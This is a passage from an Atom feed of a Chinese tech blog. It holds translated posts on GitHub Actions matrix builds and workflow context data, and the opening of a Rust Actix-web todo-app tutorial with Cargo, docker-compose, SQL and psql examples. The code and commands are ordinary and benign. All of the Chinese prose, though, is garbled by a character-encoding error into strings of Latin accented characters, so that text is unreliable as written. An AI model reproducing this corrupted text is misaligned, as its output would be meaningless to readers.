    <content type="html"><![CDATA[<p>æ‹¥æœ‰ CI/CD ç³»ç»Ÿçš„æœ€å¤§ä¼˜åŠ¿ä¹‹ä¸€æ˜¯ï¼Œå®ƒä½¿ä½ å¯ä»¥é«˜æ•ˆåœ°æ„å»ºå’Œæµ‹è¯•å¤šç§é…ç½®ã€‚åœ¨æ¨é€ä¹‹å‰ï¼Œä½ åœ¨æœºå™¨ä¸Šè¿›è¡Œæ„å»ºå’Œæµ‹è¯•å½“ç„¶æ˜¯å¿…è¦çš„ï¼Œä½†è¿™å‡ ä¹æ˜¯ä¸å¤Ÿçš„ã€‚æ¯•ç«Ÿï¼Œä½ å¯èƒ½åªå®‰è£…äº†ä¸€ä¸ªç‰ˆæœ¬çš„èŠ‚ç‚¹ã€‚ä½†æ˜¯ï¼Œåœ¨å„ç§å¹³å°ä¸Šæ„å»ºå°†ä½¿ä½ å……æ»¡ä¿¡å¿ƒå’Œæ´å¯ŸåŠ›ï¼Œä½¿ä½ çš„æ›´æ”¹å¯ä»¥åœ¨ä½ æ”¯æŒçš„æ•´ä¸ªç”Ÿæ€ç³»ç»Ÿä¸­å‘æŒ¥ä½œç”¨ã€‚</p><span id="more"></span><p><a href="https://www.jwz.org/blog/2011/08/weaponized-tinderbox/">Mozilla Tinderbox</a> æ˜¯æœ€æ—©å¼•å…¥è·¨å¤šä¸ªé…ç½®æ„å»ºæ¦‚å¿µçš„ CI ç³»ç»Ÿä¹‹ä¸€ã€‚è¿™æ˜¯é©å‘½æ€§çš„â”€â”€å½“æˆ‘ä½¿ç”¨ <a href="https://www.abisource.com/">AbiWord</a> æ—¶ï¼Œæˆ‘è´Ÿè´£äº† Tinderbox çš„è®¾ç½®ã€‚æˆ‘ä»¬æœ‰ä¸€ä¸ªå……æ»¡æœºå™¨çš„å®éªŒå®¤ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥æµ‹è¯• Motif æ„å»ºå’Œ GTK æ„å»ºï¼Œå¹¶å¯ä»¥é’ˆå¯¹ä¸åŒçš„ä¾èµ–é¡¹è¿›è¡Œæµ‹è¯•ï¼ˆè¿™æ˜¯åœ¨ä»å¯æ€•çš„ libc5 åˆ° libc6 è¿ç§»çš„æ—¶å€™ï¼‰ï¼Œç”šè‡³æ˜¯ä¸åŒçš„ C ++ ç¼–è¯‘å™¨ã€‚</p><p>é‚£æ—¶ï¼Œæˆ‘çš„å·¥ä½œå¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯ç»´æŠ¤è¿™ä¸ªè£…æœ‰æ˜‚è´µè®¡ç®—æœºçš„å®éªŒå®¤ã€‚å› æ­¤ï¼Œæˆ‘æœ€å–œæ¬¢çš„ GitHub Actions ç‰¹æ€§ä¹‹ä¸€å°±æ˜¯çŸ©é˜µå·¥ä½œæµåŠŸèƒ½ä¹Ÿå°±ä¸è¶³ä¸ºå¥‡äº†ï¼Œå®ƒä½¿æˆ‘èƒ½å¤Ÿå¿«é€Ÿè¿è¡Œå¤šä¸ªæ„å»ºä»¥æ”¯æŒå„ç§é…ç½®ã€‚</p><p>æˆ‘ä»ç„¶åœ¨ç¼–å†™ä»£ç ï¼Œå› æ­¤ä»ç„¶éœ€è¦ä½¿ç”¨ä¸åŒçš„ç¼–è¯‘å™¨å’Œä¸åŒçš„ä¾èµ–é¡¹è¿›è¡Œæ„å»ºã€‚ä½†æ˜¯ç°åœ¨æˆ‘ä¸éœ€è¦ä¸€ä¸ªå……æ»¡æœºå™¨çš„å®éªŒå®¤ï¼Œæˆ‘åªéœ€è¦åœ¨ GitHub Actions ä¸­ä½¿ç”¨çŸ©é˜µå·¥ä½œæµè®¾ç½®å³å¯ã€‚</p><p>çŸ©é˜µå·¥ä½œæµä¸€å¼€å§‹å¯èƒ½çœ‹èµ·æ¥æœ‰äº›è®©äººä¸çŸ¥æ‰€æªï¼Œä½†è¿™å®é™…ä¸Šåªæ˜¯ç®€å•çš„å˜é‡æ›¿æ¢ã€‚æ‚¨å®šä¹‰äº†ä¸€ç»„å˜é‡ï¼Œä»¥åŠåº”åˆ†é…ç»™æ¯ä¸ªå˜é‡çš„ä¸€ç»„å€¼ã€‚ç„¶åï¼ŒGitHub Actions å°†ä½¿ç”¨è¿™äº›å˜é‡çš„æ‰€æœ‰ä¸åŒæ‰©å±•æ¥æ‰§è¡Œå·¥ä½œæµã€‚</p><p>å‡è®¾ä½ è¦æµ‹è¯•ä¸‰ä¸ªä¸åŒçš„å˜é‡ï¼Œè¿™å¾ˆå¿«å˜å¾—éå¸¸å¼ºå¤§ã€‚å°±æˆ‘è€Œè¨€ï¼Œæˆ‘æƒ³ç”¨ä¸¤ä¸ªä¸åŒçš„ C ç¼–è¯‘å™¨ï¼ˆgccå’Œclangï¼‰ï¼Œä¸‰ä¸ªä¸åŒçš„ SSL åç«¯ï¼ˆOpenSSLï¼ŒGnuTLSå’ŒNSSï¼‰ä»¥åŠä¸¤ä¸ªä¸åŒçš„ Kerberos åç«¯ï¼ˆMITå’ŒHeimdalï¼‰è¿›è¡Œæµ‹è¯•ã€‚è¦æµ‹è¯•æ‰€æœ‰è¿™äº›ä¸åŒçš„ç»„åˆï¼Œé‚£å°±æ˜¯2 * 3 * 2 = 12ç§ä¸åŒçš„é…ç½®ã€‚</p><p>ä½†æ˜¯ï¼Œæˆ‘ä¸å¿…å®šä¹‰åäºŒä¸ªä¸åŒçš„å·¥ä½œï¼ˆæˆ–æ›´ç³Ÿçš„æ˜¯ï¼Œå¿…é¡»åƒåœ¨ç³Ÿç³•çš„è¿‡å»é‚£æ ·åœ¨å®éªŒå®¤ä¸­è®¾ç½®åäºŒä¸ªä¸åŒçš„æœºå™¨ï¼‰ï¼Œæˆ‘åªéœ€æŒ‡å®šä¸€ä¸ªåŒ…å«ä¸‰ä¸ªå˜é‡çš„çŸ©é˜µå³å¯ã€‚å¦‚æœåœ¨ä½œä¸šä¸­æŒ‡å®šçŸ©é˜µï¼Œåˆ™å®é™…ä¸Šå°†è·å¾—åäºŒä¸ªä»¥ä¸åŒæ’åˆ—è¿è¡Œçš„ä½œä¸šï¼š</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">matrix:</span></span><br><span class="line">  <span class="attr">cc:</span> [<span class="string">gcc</span>, <span class="string">clang</span>]</span><br><span class="line">  <span class="attr">curl:</span> [<span class="string">openssl</span>, <span class="string">gnutls</span>, <span class="string">nss</span>]</span><br><span class="line">  <span class="attr">kerberos:</span> [<span class="string">libkrb5</span>, <span class="string">heimdal</span>]</span><br></pre></td></tr></table></figure><p>ç°åœ¨åœ¨æˆ‘çš„å·¥ä½œä¸­ï¼Œæˆ‘å¯ä»¥ä½¿ç”¨<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/contexts-and-expression-syntax-for-github-actions">çŸ©é˜µä¸Šä¸‹æ–‡</a>å¼•ç”¨è¿™äº›å˜é‡ä¸­çš„æ¯ä¸€ä¸ªã€‚ä¾‹å¦‚ï¼Œ<code>$&#123;&#123;matrix.cc&#125;&#125;</code> å°†æ‰©å±•ä¸º cc å˜é‡çš„å½“å‰å€¼ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹å·¥ä½œæµï¼Œè¯¥å·¥ä½œæµå®‰è£…æ¯ä¸ªä¾èµ–é¡¹ï¼Œå¹¶è¿è¡Œæˆ‘çš„ autoconf è®¾ç½®ï¼Œç„¶åè¿è¡Œ makeï¼š</p><script src="https://gist.github.com/ethomson/5570201b04670fb90c1b0450db19e01a.js"></script><p>å½“ä½ è¿è¡Œæ­¤å·¥ä½œæµç¨‹æ—¶ï¼Œä½ å¯ä»¥å¿«é€ŸæŸ¥çœ‹å®ƒå¦‚ä½•æ‰©å±•åˆ°12ä¸ªä¸åŒçš„ä½œä¸šã€‚åœ¨å·¥ä½œæµè¿è¡Œçš„å·¦ä¾§ï¼Œä½ å¯ä»¥çœ‹åˆ°å®ƒä»¬ä¸­çš„æ¯ä¸€ä¸ªã€‚ è¿™æ ·ï¼Œç®€å•çš„å·¥ä½œæµç¨‹å°±å¯ä»¥è¿…é€Ÿæ‰©å±•ã€‚</p><p>åœ¨å…¶ä¸­ä¸€ä¸ªè¿è¡Œä¸­æ‰“å¼€æ­¥éª¤æ—¶ï¼Œä½ å¯ä»¥çœ‹åˆ°ç¡®å®æˆ‘ä»¬èƒ½å¤Ÿå®‰è£…ä¾èµ–é¡¹ã€‚ å¦‚æœæ‰“å¼€ <code>build (clang, openssl, libkrb5)</code> ä»»åŠ¡ï¼Œå®é™…ä¸Šæ­£åœ¨è¿è¡Œ <code>clang</code>ï¼ˆç”± <code>$&#123;CC&#125; --version</code> æ˜¾ç¤ºï¼‰ï¼Œlibcurlçš„OpenSSLç‰ˆæœ¬ï¼ˆç”± <code>curl-config</code> æ˜¾ç¤ºï¼‰å’Œ MIT krb5ï¼ˆç”± <code>krb5-config</code> æ˜¾ç¤ºï¼‰ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77169169-07952200-6af4-11ea-8770-f381ddfaa7eb.png" alt="image"></p><p>å› æ­¤ï¼Œä½ å¯ä»¥çœ‹åˆ°ï¼Œä½ åªéœ€ä½¿ç”¨å·¥ä½œæµä¸­çš„å‡ è¡ŒçŸ©é˜µå®šä¹‰å°±å¯ä»¥æ„å»ºå…·æœ‰å¤šç§é…ç½®çš„å¼ºå¤§å·¥ä½œæµã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_2_matrixes.html">https://www.edwardthomson.com/blog/github_actions_2_matrixes.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬2å¤©ï¼šçŸ©é˜µå·¥ä½œæµ
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬12å¤©ï¼šæœ‰å…³å·¥ä½œæµç¨‹çš„ä¿¡æ¯</title>
    <link href="https://qiwihui.com/qiwihui-blog-95/"/>
    <id>https://qiwihui.com/qiwihui-blog-95/</id>
    <published>2022-08-13T01:54:25.450Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©æˆ‘ä»¬çœ‹åˆ°GitHubä¸ºGitHub Actionså·¥ä½œæµè¿è¡Œæä¾›äº†ä¸€äº›ä¿¡æ¯ï¼Œå³ <code>GITHUB_TOKEN</code>ã€‚ä½†è¿™è¿˜ä¸æ˜¯å…¨éƒ¨ã€‚GitHub Actionsè¿˜ä¸ºä½ æä¾›ä»€ä¹ˆå…¶ä»–ä¿¡æ¯ï¼Ÿ</p><p>å…¶å®å¾ˆå¤šï¼</p><p>GitHub Actions <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/contexts-and-expression-syntax-for-github-actions#github-context">è®¾ç½®äº†è®¸å¤šä¿¡æ¯â€œä¸Šä¸‹æ–‡â€</a>ï¼Œå…¶ä¸­åŒ…å«æœ‰å…³ä½ çš„å·¥ä½œæµç¨‹è¿è¡Œçš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œgithub ä¸Šä¸‹æ–‡åŒ…å«ä¿¡æ¯ï¼Œä¾‹å¦‚ä½ çš„å·¥ä½œæµåœ¨å…¶ä¸­è¿è¡Œçš„å­˜å‚¨åº“çš„åç§° <code>github.repository</code>ï¼Œå¯åŠ¨å·¥ä½œæµçš„ç”¨æˆ· <code>github.actor</code>ã€‚ä½ å¯ä»¥ä½¿ç”¨ä¸ <a href="https://qiwihui.com/qiwihui-blog-85/">å¤„ç†çŸ©é˜µ</a> å’Œ <a href="https://qiwihui.com/qiwihui-blog-94/">å¯†ç </a> ç›¸åŒçš„åŒå¼¯æ‹¬å·æ‰©å±•è¯­æ³•æ¥å¼•ç”¨å®ƒä»¬ã€‚</p><span id="more"></span><script src="https://gist.github.com/ethomson/ef9e54a1dbef5dfa240833b9b6cc6e7e.js"></script><p><img src="https://user-images.githubusercontent.com/3297411/77735916-58ea6780-7046-11ea-851f-1d015a832fce.png" alt="image"></p><p>å¦‚æœä½ æƒ³åœ¨ä¸Šä¸‹æ–‡ä¸­æŸ¥çœ‹GitHub Actionsæä¾›çš„æ‰€æœ‰ä¿¡æ¯ï¼Œåˆ™å¯ä»¥å®é™…ä½¿ç”¨æ–¹ä¾¿çš„ <code>toJson</code> å‡½æ•°æ¥è¾“å‡ºæ•´ä¸ªå¯¹è±¡ï¼š</p><script src="https://gist.github.com/ethomson/fd59328c86a28792a13c553784ce54fb.js"></script><p><img src="https://user-images.githubusercontent.com/3297411/77735932-6142a280-7046-11ea-80c6-2f1e979b2888.png" alt="image"></p><p>å¦‚æœè¿™æ ·åšï¼Œä½ ä¼šæ³¨æ„åˆ°GitHubä¸Šä¸‹æ–‡ä¸­æœ‰å¾ˆå¤šä¿¡æ¯ã€‚ç‰¹åˆ«æ˜¯ï¼Œ<code>github.event</code> å¯¹è±¡æœ¬èº«å°±æ˜¯ä¸€å—å·¨å¤§çš„jsonæ•°æ®ã€‚å®ƒåŸºæœ¬ä¸ŠåŒ…å«ä¸è§¦å‘å™¨ç›¸å¯¹åº”çš„ <a href="https://developer.github.com/v3/activity/events/types/#pushevent">Webhook ä¿¡æ¯</a>ã€‚</p><p>ç›¸åŒçš„äº‹ä»¶ä¿¡æ¯å·²ä¿å­˜åˆ°ç£ç›˜ä¸Šçš„ <code>github.event_path</code>ã€‚å› æ­¤ï¼Œä½ å¯ä»¥é€šè¿‡æ£€æŸ¥json blobæ¥è·å–å·¥ä½œæµç¨‹ä¸­çš„æ‰€æœ‰ä¿¡æ¯ã€‚å¹¸è¿çš„æ˜¯ï¼Œéå¸¸æ–¹ä¾¿çš„ <a href="https://stedolan.github.io/jq/">jq</a> å·¥å…·å·²å®‰è£…åœ¨ runner ä¸Šã€‚ä½ å¯ä»¥ä½¿ç”¨å®ƒåœ¨å‘½ä»¤è¡Œä¸Šåˆ†è§£jsonæ•°æ®ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘æƒ³è·å–å­˜å‚¨åº“ä¸­çš„æ˜Ÿæ ‡æ•°é‡å’Œforkæ•°é‡ï¼Œåˆ™å¯ä»¥ <code>jq</code> ç”¨æ¥è§£å‹ç¼©ä¿å­˜åœ¨çš„jsonæ•°æ® <code>github.event_path</code>ã€‚</p><script src="https://gist.github.com/ethomson/d1756c60ada050a30f86da44bf1e5f29.js"></script><p><img src="https://user-images.githubusercontent.com/3297411/77735957-6c95ce00-7046-11ea-9c5d-eeafe7628594.png" alt="image"></p><p>GitHub Actionsæä¾›äº†å¤§é‡æœ‰å…³å­˜å‚¨åº“ï¼Œè§¦å‘è¿è¡Œçš„æ“ä½œä»¥åŠç¯å¢ƒçš„æ•°æ®ï¼Œæ‰€æœ‰è¿™äº›ä½¿ä½ èƒ½å¤Ÿåˆ›å»ºå·¥ä½œæµä»¥æ„å»ºåº”ç”¨ç¨‹åºï¼Œéƒ¨ç½²åº”ç”¨ç¨‹åºæˆ–è‡ªåŠ¨æ‰§è¡Œå­˜å‚¨åº“ä¸­çš„æŸäº›ä»»åŠ¡ã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_12_information_about_your_workflow.html">https://www.edwardthomson.com/blog/github_actions_12_information_about_your_workflow.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬12å¤©ï¼šæœ‰å…³å·¥ä½œæµç¨‹çš„ä¿¡æ¯
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>ç”¨ Rust Actix-web å†™ä¸€ä¸ª Todo åº”ç”¨ï¼ˆä¸€ï¼‰â”€â”€ Hello world å’Œ REST æ¥å£</title>
    <link href="https://qiwihui.com/qiwihui-blog-105/"/>
    <id>https://qiwihui.com/qiwihui-blog-105/</id>
    <published>2022-08-13T01:54:25.440Z</published>
    <updated>2024-05-15T02:25:31.471Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="actix">Actix</span></h2><p>actix æ˜¯ Rust ç”Ÿæ€ä¸­çš„ Actor ç³»ç»Ÿã€‚actix-web æ˜¯åœ¨ actix actor æ¡†æ¶å’Œ Tokio å¼‚æ­¥ IO ç³»ç»Ÿä¹‹ä¸Šæ„å»ºçš„é«˜çº§ Web æ¡†æ¶ã€‚</p><p>æœ¬ç¯‡åšå®¢å®è·µä½¿ç”¨ actix-web å®ç°ä¸€ä¸ªç®€å•çš„ todo åº”ç”¨ã€‚åŸºæœ¬è¦æ±‚ï¼šäº†è§£ rust åŸºæœ¬è¯­æ³•ï¼Œäº†è§£ä¸€å®šçš„ sql å’Œ docker çŸ¥è¯†ã€‚</p><span id="more"></span><h2><span id="chuang-jian-yi-ge-hello-world-cheng-xu">åˆ›å»ºä¸€ä¸ª Hello world ç¨‹åº</span></h2><p>é¦–å…ˆï¼Œæ–°å»ºä¸€ä¸ª <code>todo-list</code> é¡¹ç›®ï¼Œå¹¶åœ¨å…¶ä¸­å¢åŠ  <code>actix-web</code> ä¾èµ–ï¼Œæˆ‘ä»¬ä½¿ç”¨æœ€æ–°çš„ actix 3.0ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cargo new todo-list</span><br><span class="line">cd todo-list</span><br></pre></td></tr></table></figure><p><code>Cargo.toml</code>ï¼š</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[package]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;todo-list&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.1.0&quot;</span></span><br><span class="line"><span class="attr">authors</span> = [<span class="string">&quot;qiwihui &lt;qwh005007@gmail.com&gt;&quot;</span>]</span><br><span class="line"><span class="attr">edition</span> = <span class="string">&quot;2018&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">actix-web</span> = <span class="string">&quot;3&quot;</span></span><br></pre></td></tr></table></figure><p>åœ¨ <code>main.rs</code> ä¸­ï¼Œä½¿ç”¨ç±»ä¼¼äº python flask çš„è¯­æ³•ï¼Œå¢åŠ ä¸€ä¸ªæœ€ç®€å•çš„ serviceã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_web::&#123;get, App, HttpServer, Responder&#125;;</span><br><span class="line"><span class="keyword">use</span> std::io::<span class="type">Result</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">hello</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">    <span class="comment">// String å®ç°äº† Responder trait</span></span><br><span class="line">    <span class="built_in">format!</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Starting server at http://127.0.0.1:8000&quot;</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">service</span>(hello))</span><br><span class="line">        .<span class="title function_ invoke__">bind</span>(<span class="string">&quot;127.0.0.1:8000&quot;</span>)?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¹¶æµ‹è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cargo run</span><br></pre></td></tr></table></figure><p>åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:8000</span></span><br><span class="line">Hello world!</span><br></pre></td></tr></table></figure><h2><span id="shu-ju-ku-she-ji">æ•°æ®åº“è®¾è®¡</span></h2><p>é¡¹ç›®ä¸­å°†ä½¿ç”¨ postgres ä½œä¸ºæ•°æ®åº“å­˜å‚¨ï¼Œä¸ºäº†æ–¹ä¾¿æ“ä½œå’Œç®¡ç†ï¼Œæˆ‘ä»¬ä½¿ç”¨ docker-compose è¿›è¡Œç®¡ç†ã€‚</p><p><code>docker-compose.yml</code></p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:11-alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">postgres</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">POSTGRES_PASSWORD:</span> <span class="string">actix</span></span><br><span class="line">      <span class="attr">POSTGRES_USER:</span> <span class="string">actix</span></span><br><span class="line">      <span class="attr">POSTGRES_DB:</span> <span class="string">actix</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">5432</span><span class="string">:5432</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ•°æ®åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œæˆ‘ä»¬è®¾è®¡æ•´ä½“æ•°æ®åº“è¡¨ç»“æ„ï¼Œå¹¶åˆ›å»ºä¸€äº›åŸºç¡€æ•°æ®ä½œä¸ºæµ‹è¯•ã€‚è¡¨ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> TodoList           TodoItem</span><br><span class="line">                   +---------+</span><br><span class="line">                   |  id     |</span><br><span class="line">+-------+          +---------+</span><br><span class="line">|  id   + &lt;-- FK --+ list_id |</span><br><span class="line">+-------+          +---------+</span><br><span class="line">| title |          | title   |</span><br><span class="line">+-------+          +---------+</span><br><span class="line">                   | checked |</span><br><span class="line">                   +---------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ <code>database.sql</code> ä¸­æ‰‹åŠ¨åˆ›å»ºè¡¨ç»“æ„å¹¶æ’å…¥æ•°æ®ï¼š</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> todo_list;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> todo_item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> todo_list (</span><br><span class="line">    id serial <span class="keyword">primary</span> key,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">150</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> todo_item (</span><br><span class="line">    id serial <span class="keyword">primary</span> key,</span><br><span class="line">    title <span class="type">varchar</span>(<span class="number">150</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    checked <span class="type">boolean</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> <span class="literal">false</span>,</span><br><span class="line">    list_id <span class="type">integer</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">foreign</span> key (list_id) <span class="keyword">references</span> todo_list(id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">    todo_list (title)</span><br><span class="line"><span class="keyword">values</span></span><br><span class="line">    (<span class="string">&#x27;List 1&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;List 2&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span></span><br><span class="line">    todo_item (title, list_id)</span><br><span class="line"><span class="keyword">values</span></span><br><span class="line">    (<span class="string">&#x27;item 1&#x27;</span>, <span class="number">1</span>),</span><br><span class="line">    (<span class="string">&#x27;item 2&#x27;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ•°æ®è¡¨å¹¶æŸ¥çœ‹ç»“æœ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">psql -h 127.0.0.1 -p 5432 -U actix actix &lt; database.sql</span> </span><br><span class="line">Password for user actix: </span><br><span class="line">NOTICE:  table &quot;todo_list&quot; does not exist, skipping</span><br><span class="line">DROP TABLE</span><br><span class="line">NOTICE:  table &quot;todo_item&quot; does not exist, skipping</span><br><span class="line">DROP TABLE</span><br><span class="line">CREATE TABLE</span><br><span class="line">CREATE TABLE</span><br><span class="line">INSERT 0 2</span><br><span class="line">INSERT 0 2</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">psql -h 127.0.0.1 -p 5432 -U actix actix</span></span><br><span class="line">Password for user actix: </span><br><span class="line">psql (12.4, server 11.9)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">actix=# \d</span><br><span class="line">              List of relations</span><br><span class="line"> Schema |       Name       |   Type   | Owner </span><br><span class="line">--------+------------------+----------+-------</span><br><span class="line"> public | todo_item        | table    | actix</span><br><span class="line"> public | todo_item_id_seq | sequence | actix</span><br><span class="line"> public | todo_list        | table    | actix</span><br><span class="line"> public | todo_list_id_seq | sequence | actix</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line">actix=# select * from todo_list;</span><br><span class="line"> id | title  </span><br><span class="line">----+--------</span><br><span class="line">  1 | List 1</span><br><span class="line">  2 | List 2</span><br><span class="line">(2 rows)</span><br></pre></td></tr></table></figure><h2><span id="huo-qu-todo-lie-biao">è·å– todo åˆ—è¡¨</span></h2><p>é¦–å…ˆï¼Œæ·»åŠ æˆ‘ä»¬éœ€è¦çš„åº“ï¼Œå…¶ä¸­ <code>serde</code> ç”¨äºåºåˆ—åŒ–ï¼Œ<code>tokio-postgres</code> æ˜¯ä¸€ç›´æ”¯æŒå¼‚æ­¥çš„ PostgreSQL å®¢æˆ·ç«¯ï¼Œ<code>deadpool-postgres</code> ç”¨äºè¿æ¥æ± çš„ç®¡ç†ã€‚</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">actix-web</span> = <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">serde</span>=<span class="string">&quot;1.0.117&quot;</span></span><br><span class="line"><span class="attr">deadpool-postgres</span> = <span class="string">&quot;0.5.0&quot;</span></span><br><span class="line"><span class="attr">tokio-postgres</span> = <span class="string">&quot;0.5.1&quot;</span></span><br></pre></td></tr></table></figure><p>å¢åŠ  <code>models.rs</code> ç”¨äºç®¡ç†æ•°æ®æ¨¡å‹ï¼Œå¹¶æ”¯æŒåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TodoList</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> id: <span class="type">i32</span>,</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize, Deserialize)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">TodoItem</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> id: <span class="type">i32</span>,</span><br><span class="line">    <span class="keyword">pub</span> title: <span class="type">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> 